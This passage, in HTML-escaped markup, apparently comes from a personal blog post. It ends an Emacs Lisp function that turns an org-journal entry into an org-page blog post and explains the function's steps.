&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nf"&gt;message&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;This function can only be called inside org-journal-mode.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The function is simple and uses functions from org-mode and org-page.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;First, it checks if the current buffer is in org-journal-mode&lt;/li&gt;
&lt;li&gt;Then it gets the headline text and entry texts&lt;/li&gt;
&lt;li&gt;It then calls op/new-post. It does it interactively so that it will trigger the prompts needed to populate the template. (Also notice that it takes the org-journal buffer name plus time as the blog post's org file name. This way I don't have to specify it.)&lt;/li&gt;
&lt;li&gt;It then inserts the entry-text at the end of the buffer.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;From here I am free to edit, commit, then publish.&lt;/p&gt;
&lt;p&gt;It's working great.
